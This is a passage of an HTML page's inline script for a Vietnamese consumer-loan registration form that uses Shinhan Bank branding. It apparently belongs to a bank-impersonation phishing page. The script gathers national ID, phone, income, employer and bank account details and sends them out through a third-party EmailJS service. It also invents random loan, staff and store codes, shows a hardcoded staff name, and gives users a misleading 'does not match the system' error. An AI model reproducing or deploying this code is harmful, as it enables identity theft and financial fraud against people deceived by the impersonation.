                $('#accountNumber').addClass('is-invalid').removeClass('valid');
                $('#accountNumber').next('.invalid-feedback').text('Số tài khoản phải có ít nhất 8 số.');
                isValid = false;
                errors.push('accountNumber: Must be at least 8 digits');
            } else {
                $('#accountNumber').removeClass('is-invalid').addClass('valid');
            }

            if (!bankName || !bankNameOptions.includes(bankName)) {
                $('#bankName').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('bankName: Invalid selection');
            } else {
                $('#bankName').removeClass('is-invalid').addClass('valid');
            }

            if (!branch || !branchOptions.includes(branch)) {
                $('#branch').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('branch: Invalid selection');
            } else {
                $('#branch').removeClass('is-invalid').addClass('valid');
            }

            if (!isValid) {
                console.log('Validation errors:', errors);
                const firstInvalid = $('#registerForm .is-invalid').first();
                if (firstInvalid.length) {
                    $('html, body').animate({
                        scrollTop: firstInvalid.offset().top - 100
                    }, 500);
                    firstInvalid.focus();
                }
            }
            return isValid;
        }

        function validateEmailParams(params) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!params.to_email || !emailRegex.test(params.to_email)) {
                console.error('Invalid to_email:', params.to_email);
                return false;
            }
            if (!params.full_name || !params.phone_number || !params.id_number || !params.loan_amount || !params.loan_term) {
                console.error('Missing required fields:', {
                    full_name: params.full_name,
                    phone_number: params.phone_number,
                    id_number: params.id_number,
                    loan_amount: params.loan_amount,
                    loan_term: params.loan_term
                });
                return false;
            }
            return true;
        }

        function validateForm() {
            const form = document.getElementById('registerForm');
            $('#registerForm .form-control, #registerForm .form-select').removeClass('is-invalid');
            $('#emailError, #storageError').hide();
            let allFieldsValid = form.checkValidity() && validateInputFormats();
            if (!allFieldsValid) {
                form.classList.add('was-validated');
            }
            console.log('Form validation:', { allFieldsValid });
        }

        function sendRegistrationDataEmail() {
            const params = {
                to_name: userData.fullName || '',
                full_name: userData.fullName || '',
                id_number: encryptData(userData.idNumber || ''),
                id_issue_date: userData.dob || '',
                id_issue_place: userData.idIssuePlace || '',
                address: userData.contactAddress || '',
                occupation: userData.companyAddress || '',
                income: userData.income ? Number(userData.income).toLocaleString('vi-VN') + ' VND' : '',
                phone_number: encryptData(userData.phoneNumber || ''),
                email: userData.email || '',
                loan_amount: userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : '',
                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
                loan_purpose: userData.companyAddress || '',
                account_number: encryptData(userData.accountNumber || ''),
                bank_name: userData.bankName || '',
                loan_code: userData.loanCode || '',
                registration_date: userData.disbursementDate || '',
                has_bad_debt: userData.hasBadDebt || '',
                has_high_debt: userData.hasHighDebt || '',
                to_email: userData.email || 'support@shinhan.com.vn',
                time: new Date().toLocaleString('vi-VN')
            };
            if (!validateEmailParams(params)) {
                $('#emailError').text('Thông tin email không hợp lệ. Vui lòng kiểm tra lại.').show();
                return;
            }
            console.log('Preparing to send EmailJS params for Step1:', params);
            emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                .then(() => {
                    console.log('Email sent successfully');
                    alert("Đã gửi hồ sơ!");
                    localStorage.removeItem('pendingEmail');
                    $('#retryEmailBtn').hide();
                    window.location.href = '/vaytieudung/shinhanbank/pages/vi/step2.html';
                })
                .catch(error => {
                    console.error('EmailJS error:', error);
                    alert("Lỗi gửi hồ sơ. Vui lòng kiểm tra và gửi lại sau.");
                    localStorage.setItem('pendingEmail', JSON.stringify(params));
                    $('#emailError').text('Lỗi hệ thống. Vui lòng thử lại sau.').show();
                    $('#retryEmailBtn').show();
                });
        }

        window.onload = function() {
            loadUserData();
            $('#fullName').val(userData.fullName || '');
            $('#dob').val(userData.dob || '');
            $('#gender').val(userData.gender || '');
            $('#contactAddress').val(userData.contactAddress || '');
            $('#hometown').val(userData.hometown || '');
            $('#idNumber').val(userData.idNumber || '');
            $('#nationality').val(userData.nationality || '');
            $('#idIssuePlace').val(userData.idIssuePlace || 'CỤC TRƯỞNG CỤC CẢNH SÁT QUẢNG LÍ HÀNH CHÍNH VỀ TRẬT TỰ XÃ HỘI (CTCCSQLACVTTXH)');
            $('#phoneNumber').val(userData.phoneNumber || '');
            $('#email').val(userData.email || '');
            $('#loanType').val(userData.loanType || '');
            $('#loanTerm').val(userData.loanTerm || '');
            $('#loanAmountInput').val(userData.loanAmount || '');
            $('#disbursementDate').val(userData.disbursementDate || getCurrentDate());
            $('#income').val(userData.income ? formatNumberInput(userData.income) : '');
            $('#companyName').val(userData.companyName || '');
            $('#companyPhone').val(userData.companyPhone || '');
            $('#companyAddress').val(userData.companyAddress || '');
            $('#hasBadDebt').val(userData.hasBadDebt || '');
            $('#hasHighDebt').val(userData.hasHighDebt || '');
            $('#accountHolderName').val(userData.accountHolderName || '');
            $('#accountNumber').val(userData.accountNumber || '');
            $('#bankName').val(userData.bankName || '');
            $('#branch').val(userData.branch || '');
            const pendingEmail = localStorage.getItem('pendingEmail');
            if (pendingEmail) {
                $('#retryEmailBtn').show();
            }
            var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
            tooltipTriggerList.map(function (tooltipTriggerEl) {
                return new bootstrap.Tooltip(tooltipTriggerEl);
            });
        };

        const debouncedValidateForm = debounce(validateForm, 300);

        $('#dob, #disbursementDate').on('input', function() {
            formatDateInput($(this));
            debouncedValidateForm();
        });

        $('#income, #accountNumber').on('input', function() {
            let value = $(this).val().replace(/[^0-9]/g, '');
            if (value && this.id !== 'accountNumber') {
                $(this).val(formatNumberInput(value));
            } else {
                $(this).val(value);
            }
            debouncedValidateForm();
        });

        $('#registerForm input, #registerForm select').on('input change', debouncedValidateForm);

        $('#retryEmailBtn').on('click', function() {
            const pendingEmail = localStorage.getItem('pendingEmail');
            if (pendingEmail) {
                try {
                    const params = JSON.parse(pendingEmail);
                    if (validateEmailParams(params)) {
                        sendRegistrationDataEmail();
                    }
                } catch (error) {
                    console.error('Error retrying pending email:', error);
                    $('#emailError').text('Thông tin đăng ký không trùng khớp trên hệ thống. Vui lòng thử lại sau.').show();
                }
            }
        });

        $('#registerForm').on('submit', function(e) {
            e.preventDefault();
            const form = e.target;
            form.classList.add('was-validated');
            $('#storageError, #emailError').hide();
            if (form.checkValidity() && validateInputFormats()) {
                const income = $('#income').val().replace(/[^0-9]/g, '');
                const loanAmount = $('#loanAmountInput').val();
                userData = {
                    fullName: $('#fullName').val().trim(),
                    dob: $('#dob').val().trim(),
                    gender: $('#gender').val(),
                    contactAddress: $('#contactAddress').val().trim(),
                    hometown: $('#hometown').val().trim(),
                    idNumber: $('#idNumber').val().trim(),
                    nationality: $('#nationality').val(),
                    idIssuePlace: $('#idIssuePlace').val(),
                    phoneNumber: $('#phoneNumber').val().trim(),
                    email: $('#email').val().trim(),
                    loanType: $('#loanType').val(),
                    loanTerm: $('#loanTerm').val(),
                    loanAmount: loanAmount,
                    disbursementDate: $('#disbursementDate').val().trim(),
                    income: income,
                    companyName: $('#companyName').val().trim(),
                    companyPhone: $('#companyPhone').val().trim(),
                    companyAddress: $('#companyAddress').val().trim(),
                    hasBadDebt: $('#hasBadDebt').val(),
                    hasHighDebt: $('#hasHighDebt').val(),
                    accountHolderName: $('#accountHolderName').val().trim(),
                    accountNumber: $('#accountNumber').val().trim(),
                    bankName: $('#bankName').val(),
                    branch: $('#branch').val(),
                    loanCode: "SHB" + Math.floor(100000 + Math.random() * 900000),
                    registrationDate: getCurrentDate(),
                    monthlyPayment: calculateMonthlyPayment(loanAmount, $('#loanTerm').val()),
                    interestRate: calculateInterestRate(loanAmount),
                    sellerCode: generateRandomCode(),
                    storeCode: generateRandomCode(),
                    staffCode: generateRandomCode(),
                    staffName: "Nguyễn Thị Mỹ Duyên",
                    isRegistered: false,
                    qrData: {},
                    atmCard: {},
                    currentStep: 2
                };
                console.log('Submitting userData:', userData);
                if (userData.idNumber) {
                    const registeredIds = loadRegisteredIds();
                    registeredIds.push(userData.idNumber);
                    saveRegisteredIds(registeredIds);
                }
                if (saveToLocalStorage()) {
                    sendRegistrationDataEmail();
                } else {
                    console.error('Failed to save to localStorage, not redirecting');
                    alert('Thông tin không trùng khớp trên hệ thống. Quý khách vui lòng kiểm tra và thử lại sau.');
                }
            } else {
                console.warn('Form validation failed.');
                alert('Vui lòng điền đầy đủ thông tin bắt buộc.');
            }
        });

        function generateRandomCode() {
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let result = "";
            for (let i = 0; i < 6; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
    </script>
</body>
</html>
